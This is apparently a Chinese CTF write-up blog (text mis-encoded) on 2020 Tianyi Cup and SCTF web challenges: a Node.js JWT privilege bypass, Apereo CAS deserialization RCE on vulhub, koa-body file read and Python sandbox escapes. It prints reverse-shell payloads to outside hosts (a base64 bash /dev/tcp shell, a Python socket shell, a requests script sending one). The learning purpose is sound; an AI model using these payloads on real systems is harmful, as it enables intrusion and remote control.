class="line"></span><br><span class="line">  <span class="keyword">if</span>(blacklist.includes(arr)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> element = arr[i];</span><br><span class="line">    <span class="keyword">if</span> (blacklist.includes(element)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">"/"</span>, (req, res) =&gt; &#123;</span><br><span class="line">  res.json(ok(&#123; <span class="attr">hint</span>:  <span class="string">"You can get source code from /source"</span>&#125;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">"/source"</span>, (req, res) =&gt; &#123;</span><br><span class="line">    res.sendFile( __dirname + <span class="string">"/"</span> + <span class="string">"app.js"</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">"/login"</span>, (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> u = &#123;</span><br><span class="line">    username: req.body.username,</span><br><span class="line">    id: uuidv4(),</span><br><span class="line">    value: <span class="built_in">Math</span>.random() &lt; <span class="number">0.0000001</span> ? <span class="number">100000000</span> : <span class="number">100</span>,</span><br><span class="line">    isAdmin: <span class="literal">false</span>,</span><br><span class="line">    rights: [</span><br><span class="line">      <span class="string">"message"</span>,</span><br><span class="line">      <span class="string">"adminUsername"</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="built_in">console</span>.log(u);</span><br><span class="line">  <span class="keyword">if</span> (isValidUser(u)) &#123;</span><br><span class="line">    users[u.id] = u;</span><br><span class="line">    res.send(ok(&#123; <span class="attr">token</span>: sign(&#123; <span class="attr">id</span>: u.id &#125;) &#125;));</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.json(err(<span class="string">"Invalid creds"</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">"/init"</span>, (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> &#123; secret &#125; = req.body;</span><br><span class="line">  <span class="keyword">let</span> target = md5(config.secret.toString());</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> adminId = md5(secret)</span><br><span class="line">    .split(<span class="string">""</span>)</span><br><span class="line">    .map(<span class="function">(<span class="params">c, i</span>) =&gt;</span> c.charCodeAt(<span class="number">0</span>) ^ target.charCodeAt(i))</span><br><span class="line">    .reduce(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a + b);</span><br><span class="line">  <span class="built_in">console</span>.log(adminId);</span><br><span class="line">  res.json(ok(&#123; <span class="attr">token</span>: sign(&#123; <span class="attr">id</span>: adminId &#125;) &#125;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Get server info</span></span><br><span class="line">app.get(<span class="string">"/serverInfo"</span>, (req, res) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(req.user);</span><br><span class="line">  <span class="keyword">let</span> user = users[req.user.id] || &#123; <span class="attr">rights</span>: [] &#125;;</span><br><span class="line">  <span class="built_in">console</span>.log(user);</span><br><span class="line">  <span class="keyword">let</span> info = user.rights.map(<span class="function"><span class="params">i</span> =&gt;</span> (&#123; <span class="attr">name</span>: i, <span class="attr">value</span>: config[i] &#125;));</span><br><span class="line">  res.json(ok(&#123; <span class="attr">info</span>: info &#125;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">"/becomeAdmin"</span>, (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> &#123;value&#125; = req.body;</span><br><span class="line">  <span class="keyword">let</span> uid = req.user.id;</span><br><span class="line">  <span class="keyword">let</span> user = users[uid];</span><br><span class="line">  <span class="built_in">console</span>.log(user);</span><br><span class="line">  <span class="keyword">let</span> maxValue = [value, config.adminValue].sort()[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">if</span>(value &gt;= maxValue &amp;&amp; user.value &gt;= value) &#123;</span><br><span class="line">    user.isAdmin = <span class="literal">true</span>;</span><br><span class="line">    res.send(ok(&#123; <span class="attr">isAdmin</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    res.json(err(<span class="string">"You need pay more!"</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// only admin can update user</span></span><br><span class="line">app.post(<span class="string">"/updateUser"</span>, (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> uid = req.user.id;</span><br><span class="line">  <span class="keyword">let</span> user = users[uid];</span><br><span class="line">  <span class="keyword">if</span> (!user || !isAdmin(user)) &#123;</span><br><span class="line">    res.json(err(<span class="string">"You're not an admin!"</span>));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> rights = req.body.rights || [];</span><br><span class="line">  <span class="keyword">if</span> (rights.length &gt; <span class="number">0</span> &amp;&amp; checkRights(rights)) &#123;</span><br><span class="line">    users[uid].rights = user.rights.concat(rights).filter(<span class="function">(<span class="params">value, index, self</span>)=&gt;</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> self.indexOf(value) === index;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  res.json(ok(&#123; <span class="attr">user</span>: users[uid] &#125;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// only uid===0 can get the flag</span></span><br><span class="line">app.get(<span class="string">"/flag"</span>, (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.user.id == <span class="number">0</span>) &#123;</span><br><span class="line">    res.send(ok(&#123; <span class="attr">flag</span>: flag &#125;));</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.send(err(<span class="string">"Unauthorized"</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">server.listen(config.port, () =&gt;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`Server listening on port <span class="subst">$&#123;config.port&#125;</span>!`</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>åœ¨app.jsç›®å½•ä¸‹æ–°å»ºflag.jsonï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"flag"</span>: <span class="string">"flag&#123;mount4in&#125;"</span>,</span><br><span class="line">    <span class="attr">"secret"</span>: <span class="string">"1145141919810"</span>,</span><br><span class="line">    <span class="attr">"jwtSecret"</span>: <span class="string">"secret"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>package.json</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>: <span class="string">"api"</span>,</span><br><span class="line">  <span class="attr">"version"</span>: <span class="string">"1.0.0"</span>,</span><br><span class="line">  <span class="attr">"description"</span>: <span class="string">""</span>,</span><br><span class="line">  <span class="attr">"main"</span>: <span class="string">"app.js"</span>,</span><br><span class="line">  <span class="attr">"scripts"</span>: &#123;</span><br><span class="line">    <span class="attr">"test"</span>: <span class="string">"echo \"Error: no test specified\" &amp;&amp; exit 1"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"author"</span>: <span class="string">""</span>,</span><br><span class="line">  <span class="attr">"license"</span>: <span class="string">"ISC"</span>,</span><br><span class="line">  <span class="attr">"dependencies"</span>: &#123;</span><br><span class="line">    <span class="attr">"cors"</span>: <span class="string">"^2.8.5"</span>,</span><br><span class="line">    <span class="attr">"express"</span>: <span class="string">"^4.17.1"</span>,</span><br><span class="line">    <span class="attr">"express-jwt"</span>: <span class="string">"^5.0.0"</span>,</span><br><span class="line">    <span class="attr">"md5"</span>: <span class="string">"^2.3.0"</span>,</span><br><span class="line">    <span class="attr">"uuid"</span>: <span class="string">"^8.3.0"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åˆ†æé¢˜ç›®ï¼Œé¢˜ç›®æ˜¯æ”¹çš„<a href="https://xz.aliyun.com/t/7177" target="_blank" rel="noopener">HackTM</a>çš„ä¸€é“Node Jsï¼Œè¾ƒåŸé¢˜æ·»åŠ äº†ä¸€ä¸ªå…³äºjavascriptä¸­sort()å‡½æ•°çš„trickã€‚</p>
<img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806085223552.png" alt="image-20200806085223552" style="zoom:200%;">

<p>æ¥ä¸‹æ¥åˆ†æé¢˜ç›®ï¼Œé¢˜ç›®æºç å¼•ç”¨äº†jsonwebtokenå’Œexpress-jwtä¸¤ä¸ªåº“ï¼Œjsonwebtokenç”¨æ¥ç”Ÿæˆjwtï¼Œå‘é€ç»™å®¢æˆ·ç«¯ï¼Œexpress-jwtç”¨æ¥è§£å¯†å®¢æˆ·ç«¯å‘é€HTTPè¯·æ±‚ä¸­æºå¸¦çš„Authorizationå­—æ®µï¼Œç„¶åå°†è§£å¯†åçš„å€¼èµ‹ç»™<code>req.user</code>ã€‚å¦‚ä¸‹å›¾çš„ä»£ç ï¼Œè¡¨ç¤ºé™¤äº†<code>/</code>, <code>/login</code>, <code>/init</code>, <code>/source</code>è¿™å››ä¸ªè·¯ç”±ä»¥å¤–ï¼Œè®¿é—®å…¶ä»–è·¯ç”±æ—¶éƒ½éœ€è¦å¸¦Authorizationå­—æ®µã€‚</p>
<p><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806085727632.png" alt="image-20200806085727632"></p>
<p>é¦–å…ˆçœ‹å¦‚ä½•æ‰èƒ½å¾—åˆ°flagï¼Œ</p>
<img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806085323881.png" alt="image-20200806085323881" style="zoom:200%;">

<p>å¿…é¡»è¦req.user.idä¸º0æ‰å¯ä»¥å¾—åˆ°flagï¼Œæ¥ä¸‹æ¥å¯»æ‰¾æ€ä¹ˆèƒ½è®©user.idä¸º0ï¼Œçœ‹/initè·¯ç”±</p>
<img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806090112714.png" alt="image-20200806090112714" style="zoom:200%;">

<p>ä¸Šè¿°ä»£ç ï¼Œé¦–å…ˆè·å–è¯·æ±‚çš„secretå€¼ï¼Œç„¶åå°†è¯·æ±‚è¾“å…¥çš„secretå’Œæºç ä¸­configä¸­çš„secretåˆ†åˆ«MD5å¤„ç†ï¼Œä¹‹åå°†è¿™ä¸¤ä¸ªMD5ç”Ÿæˆçš„å­—ç¬¦ä¸²æ¯ä½åˆ†åˆ«è¿›è¡Œå¼‚æˆ–ï¼Œç„¶åå°†æ¯ä¸€ä½å¼‚æˆ–å¾—åˆ°çš„ç»“æœå–å’Œï¼Œå°†å’Œèµ‹ç»™adminIdï¼Œåˆ©ç”¨jsonwebtokenè¿›è¡ŒåŠ å¯†ã€‚æˆ‘ä»¬éœ€è¦å¾—åˆ°idä¸º0å¯¹åº”çš„token,æ‰€ä»¥éœ€è¦ä½¿è¿™é‡Œçš„adminIdä¸º0ï¼Œå½“ä¸¤ä¸ªç›¸åŒçš„æ•°å¼‚æˆ–å¾—åˆ°çš„ç»“æœä¸º0ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦æˆ‘ä»¬è¾“å…¥çš„secretå’Œæºç ä¸­config.secretç›¸åŒï¼Œæ¥ä¸‹æ¥éœ€è¦å¯»æ‰¾config.secretçš„å€¼ã€‚æ™®é€šçš„ç”¨æˆ·è®¿é—®/serverinfoå¾—åˆ°çš„ä¿¡æ¯åªæœ‰messageå’ŒadminUsernameï¼Œæ‰€ä»¥éœ€è¦æ›´æ–°æƒé™è·å¾—secretã€‚</p>
<p><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806091148515.png" alt="image-20200806091148515"></p>
<p>åœ¨/updateUserè·¯ç”±å¯ä»¥æ ¹æ®è¾“å…¥çš„rightsæ›´æ–°ç”¨æˆ·çš„æƒé™ï¼Œä½†æ˜¯éœ€è¦æ˜¯adminã€‚</p>
<p><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806091329390.png" alt="image-20200806091329390"></p>
<p>çœ‹ä¸€ä¸‹isAdmin()å‡½æ•°</p>
<p><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806091539505.png" alt="image-20200806091539505"></p>
<p>å¤§å°å†™åº”è¯¥æ˜¯ç»•ä¸è¿‡äº†ï¼Œçœ‹å“ªé‡Œå¯ä»¥ä¿®æ”¹u.isAdminï¼Œ</p>
<img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806091642147.png" alt="image-20200806091642147" style="zoom:150%;">

<p>åœ¨/becomeAdminè·¯ç”±ï¼Œå› ä¸ºç™»å½•æ—¶user.valueå€¼æœ‰å¾ˆå¤§çš„æ¦‚ç‡ä¸º100</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">let u = &#123;</span><br><span class="line">    username: req.body.username,</span><br><span class="line">    id: uuidv4(),</span><br><span class="line">    value: Math.random() &lt; <span class="number">0.0000001</span> ? <span class="number">100000000</span> : <span class="number">100</span>,</span><br><span class="line">    isAdmin: <span class="keyword">false</span>,</span><br><span class="line">    rights: [</span><br><span class="line">      <span class="string">"message"</span>,</span><br><span class="line">      <span class="string">"adminUsername"</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨sort()å‡½æ•°æ’åºçš„é—®é¢˜ï¼Œè¾“å…¥valueä¸º2å³å¯ç»•è¿‡ï¼Œæˆä¸ºadmin,ç„¶åçœ‹checkRights()å‡½æ•°ï¼Œ</p>
<p><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806091346333.png" alt="image-20200806091346333"></p>
<p>è¿™é‡Œéå†æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œå¦‚æœåŒ…å«secretå°±ä¸èƒ½æ·»åŠ ï¼Œé‡‡ç”¨<code>[[&quot;secret&quot;]]</code>å¯ä»¥ç»•è¿‡ã€‚</p>
<p><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806093341659.png" alt="image-20200806093341659" style="zoom: 150%;"><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806093503900.png" alt="image-20200806093503900"></p>
<p><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806093341659.png" alt="image-20200806093341659" style="zoom: 150%;"><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806093503900.png" alt="image-20200806093503900"></p>
<p>ä¹‹ååˆ©ç”¨/serverInfoå¾—åˆ°secretï¼Œåœ¨ç”¨/initå¾—åˆ°idä¸º1çš„ç”¨æˆ·tokenå»è®¿é—®/flagå³å¯ã€‚</p>
<p>è§£é¢˜è¿‡ç¨‹</p>
<ol>
<li><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806093725700.png" alt="image-20200806093725700"></li>
<li><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806093800754.png" alt="image-20200806093800754"></li>
<li><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806093822275.png" alt="image-20200806093822275"></li>
<li><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806093913761.png" alt="image-20200806093913761"></li>
<li><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806093948710.png" alt="image-20200806093948710"></li>
<li><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806094012071.png" alt="image-20200806094012071"></li>
</ol>
<h1 id="0x02-apereocas"><a href="#0x02-apereocas" class="headerlink" title="0x02 apereocas"></a>0x02 <strong>apereocas</strong></h1><p>åˆ©ç”¨pç¥çš„vulhubç¯å¢ƒè¿›è¡Œå¤ç°ï¼Œ</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">cd vulhub/apereo-cas/4.1-rce/</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806203813868.png" alt="image-20200806203813868"></p>
<ul>
<li><h2 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h2></li>
</ul>
<p><a href="https://github.com/vulhub/Apereo-CAS-Attack" target="_blank" rel="noopener">Apereo-CAS-Attack</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzk5OTkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806204844774.png" alt="image-20200806204844774"></p>
<p>burpå‘åŒ…ï¼š</p>
<p>vpsï¼š</p>
<p><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806204957401.png" alt="image-20200806204957401"></p>
<ul>
<li><h2 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h2></li>
</ul>
<p><a href="https://github.com/potats0/CasExp" target="_blank" rel="noopener">CasExp</a></p>
<p>ä¸‹è½½ä¸‹æ¥éœ€è¦è‡ªå·±æ‰“åŒ…æ‰å¯ä»¥ç”¨ï¼Œè®°å½•ä¸‹è‡ªå·±æ‰“åŒ…mvné¡¹ç›®æ—¶è¸©çš„å‘ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;potats0&#x2F;CasExp</span><br></pre></td></tr></table></figure>

<p>é…ç½®maven</p>
<p><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200808111602995.png" alt="image-20200808111602995"></p>
<p>é€‰æ‹©Enable Auto-Import</p>
<p><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200808111507624.png" alt="image-20200808111507624"></p>
<p>æ‰“åŒ…</p>
<p><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200808111843296.png" alt="image-20200808111843296"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar CasPoc-1.0-SNAPSHOT-jar-with-dependencies.jar http://192.168.35.158:8080/cas/login  "cat /flag"</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200808122316103.png" alt="image-20200808122316103"></p>
<p><a href="https://www.cnblogs.com/phpdragon/p/7216626.html" target="_blank" rel="noopener">å‚è€ƒ</a></p>
]]></content>
  </entry>
  <entry>
    <title>2020SCTFWebé¢˜ç›®å¤ç°</title>
    <url>/2020/07/07/2020SCTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>SCTFå‡ é“Webé¢˜ç›®å¤ç°</p>
<a id="more"></a>

<h1 id="0x01-CloudDisk"><a href="#0x01-CloudDisk" class="headerlink" title="0x01 CloudDisk"></a>0x01 <strong>CloudDisk</strong></h1><p><a href="https://github.com/dlau/koa-body/issues/75" target="_blank" rel="noopener">https://github.com/dlau/koa-body/issues/75</a></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"files"</span>:&#123;<span class="attr">"file"</span>:&#123;<span class="attr">"name"</span>:<span class="string">"aaa"</span>,<span class="attr">"path"</span>:<span class="string">"/proc/self/cwd/flag"</span>&#125;&#125;&#125;</span><br><span class="line">&#123;<span class="attr">"files"</span>:&#123;<span class="attr">"file"</span>:&#123;<span class="attr">"name"</span>:<span class="string">"aaa"</span>,<span class="attr">"path"</span>:<span class="string">"/app/flag"</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<h1 id="0x02-pysandbox"><a href="#0x02-pysandbox" class="headerlink" title="0x02 pysandbox"></a>0x02 <strong>pysandbox</strong></h1><blockquote>
<p>W&amp;M</p>
</blockquote>
<p>åˆ©ç”¨request.argsã€request.methodå’Œä¿®æ”¹static_folder</p>
<p>èƒŒæ™¯çŸ¥è¯†ï¼š</p>
<ul>
<li><p>flaskç›®å½•ç»“æ„</p>
<p>/app.py</p>
<p>/templates</p>
<p>â€‹        /index.html</p>
<p>/static</p>
<p>â€‹        /style.css</p>
<p>å¯ä»¥åˆ©ç”¨<code>app.static_folder=/</code>      å°†<code>/</code>è®¾ç½®ä¸ºé™æ€ç›®å½•</p>
</li>
<li><p>request.method   POST</p>
</li>
<li><p>request.args   POST=/       </p>
</li>
</ul>
<p><img src="/2020/07/07/2020SCTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708100928461.png" alt="image-20200708100928461"></p>
<p>è®¿é—®/static/flag</p>
<p><img src="/2020/07/07/2020SCTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708100958032.png" alt="image-20200708100958032"></p>
<blockquote>
<p>å¦ä¸€ç§æ–¹æ³•</p>
</blockquote>
<p>åˆ©ç”¨app.root_path[:1]å–å¾—/</p>
<p><img src="/2020/07/07/2020SCTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708103617752.png" alt="image-20200708103617752"></p>
<h1 id="0x02-pysandbox2"><a href="#0x02-pysandbox2" class="headerlink" title="0x02 pysandbox2"></a>0x02 <strong>pysandbox2</strong></h1><blockquote>
<p>Nepnep</p>
</blockquote>
<p>èƒŒæ™¯çŸ¥è¯†ï¼š</p>
<p>builtinsæ¨¡å—æä¾›å¯¹Pythonçš„æ‰€æœ‰â€œå†…ç½®â€æ ‡è¯†ç¬¦çš„ç›´æ¥è®¿é—®ï¼Œé‡Œé¢åŒ…å«pythonçš„å†…ç½®å‡½æ•°ã€‚ä½œä¸ºä¸€ä¸ªå®ç°ç»†èŠ‚ï¼Œå¤§å¤šæ•°æ¨¡å—éƒ½å°†åç§° <code>__builtins__</code> ä½œä¸ºå…¶å…¨å±€å˜é‡çš„ä¸€éƒ¨åˆ†æä¾›ã€‚ <code>__builtins__</code> çš„å€¼é€šå¸¸æ˜¯è¿™ä¸ªæ¨¡å—æˆ–è€…è¿™ä¸ªæ¨¡å—çš„å€¼ <a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#object.__dict__" target="_blank" rel="noopener"><code>__dict__</code></a> å±æ€§ã€‚è¿™ä¸€ç‚¹åœ¨SSTIä¸­ç”¨çš„æ¯”è¾ƒå¤šã€‚</p>
<p><img src="/2020/07/07/2020SCTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708104304296.png" alt="image-20200708104304296"></p>
<p>å¯ä»¥åˆ©ç”¨<code>__builtins__.__dict__[&#39;ord&#39;]=lambda args:42</code>é‡å†™ord()å‡½æ•°ã€‚</p>
<blockquote>
<p>lambda arguments : expression</p>
<p>lambda*args:expression</p>
</blockquote>
<img src="/2020/07/07/2020SCTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708103125255.png" alt="image-20200708103125255" style="zoom:200%;">

<p>ä¹‹åå°±å¯ä»¥ç»•è¿‡securityçš„æ£€æµ‹ã€‚</p>
<img src="/2020/07/07/2020SCTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708104958779.png" alt="image-20200708104958779" style="zoom:200%;">

<p>ç„¶åå°±å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__builtins__.ord&#x3D;lambda*args:42</span><br><span class="line"></span><br><span class="line">__import__(&quot;os&quot;).popen(&quot;curl  ip:8888&quot;)</span><br><span class="line"></span><br><span class="line">import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;]);</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/07/2020SCTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708110333343.png" alt="image-20200708110333343"></p>
<p>è¿˜æœ‰å¦ä¸€ç§æ–¹æ³•ï¼Œå¯ä»¥å°†ç»“æœå›æ˜¾</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">app.view_functions[&#39;security&#39;]&#x3D;lambda: __import__(&#39;os&#39;).popen(&#39;id&#39;).read()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/07/2020SCTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200708111330602.png" alt="image-20200708111330602"></p>
<blockquote>
<p><a href="http://www.l-team.org/archives/379.html" target="_blank" rel="noopener">L-team</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests </span><br><span class="line">print(requests.post(&#39;http:&#x2F;&#x2F;39.104.90.30:10005&#39;, data&#x3D;&#123;</span><br><span class="line">	&#39;cmd&#39;:</span><br><span class="line">    &#39;Flask.__doc__&#x3D;request.form[secret[0]];&#39;</span><br><span class="line">    &#39;app.make_response&#x3D;lambda*p:Flask.__doc__;&#39;</span><br><span class="line">    &#39;app.process_response&#x3D;exec&#39;,</span><br><span class="line">    &#39;F&#39;: &quot;__import__(&#39;os&#39;).system(\&quot;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;my_ip&#x2F;23333 0&gt;&amp;1&#39;\&quot;)&quot; &#125;))</span><br></pre></td></tr></table></figure>

<p><a href="http://blog.ccreater.top/" target="_blank" rel="noopener">oxcccccc</a></p>
